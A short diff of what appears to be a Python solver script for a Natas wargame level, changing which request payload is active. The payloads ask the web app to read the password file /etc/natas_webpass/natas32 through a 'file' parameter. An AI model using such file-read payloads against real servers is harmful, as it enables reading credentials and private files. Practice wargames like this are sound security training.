@@ -25,7 +25,7 @@ file2 = [
     ('file', ('csv1.csv',open('csv1.csv', 'rb')))]
 payload = {'file':'/etc/natas_webpass/natas32'}
 payload = {'file':'index-source.html'}
-payload = [('file','index.pl'), ('file','/etc/natas_webpass/natas32'), ('file','35'), ('file', '*')]
+#payload = [('file','index.pl'), ('file','/etc/natas_webpass/natas32'), ('file','35'), ('file', '*')]
 #payload = {'file':}
 
 file1 = {'file': ("cat",open('csv2.csv', 'rb'))}
